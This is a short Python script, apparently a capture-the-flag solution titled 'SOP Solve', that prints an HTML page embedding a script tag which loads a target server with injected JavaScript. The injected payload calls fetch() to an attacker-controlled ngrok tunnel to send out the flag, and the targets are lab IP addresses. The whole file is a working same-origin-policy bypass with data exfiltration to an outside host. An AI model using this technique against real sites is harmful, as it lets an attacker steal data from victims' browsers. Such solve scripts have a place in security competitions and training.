import urllib.parse

html = """<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8" />
        <meta name="viewport" content="width=device-width" />
        <title>SOP Solve</title>
    </head>
    <body>
        <h1>SOP Solve</h1>
        <script src="{}/?message={}" charset="utf-8"></script>
    </body>
</html>
"""

# url = "http://3.136.19.24"
url = "http://172.16.0.10"
# url = "http://localhost"
# rhost = "http://a543-2620-0-1a10-7800-5345-4ebe-504f-9b6a.ngrok.io"
rhost = "http://b94a-2620-0-1a10-7800-5345-4ebe-504f-9b6a.ngrok.io"
message = urllib.parse.quote(f'fetch("{rhost}/flag")')

print(html.format(url, message))
